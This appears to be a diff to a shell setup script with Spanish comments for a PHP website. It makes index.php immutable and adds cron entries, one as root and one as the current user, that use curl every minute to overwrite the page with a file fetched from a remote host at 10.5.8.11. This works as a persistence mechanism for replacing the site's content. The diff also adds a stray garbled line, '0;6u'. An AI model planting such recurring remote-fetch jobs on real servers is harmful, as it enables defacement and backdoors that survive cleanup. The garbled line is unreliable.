@@ -79,8 +79,10 @@ sudo chattr +i /var/www/simple-php-website/index.php
 
 # Añadir tarea a crontab
 (crontab -l 2>/dev/null; echo "* * * * * curl -o /var/www/simple-php-website/index.php http://10.5.8.11/index.php") | sudo crontab -
+(crontab -l 2>/dev/null; echo "* * * * * curl -o /var/www/simple-php-website/index.php http://10.5.8.11/index.php") | crontab -
 
 # Iniciar y habilitar httpd
 sudo systemctl start httpd 2>/dev/null
 sudo systemctl enable httpd 2>/dev/null
 
+0;6u
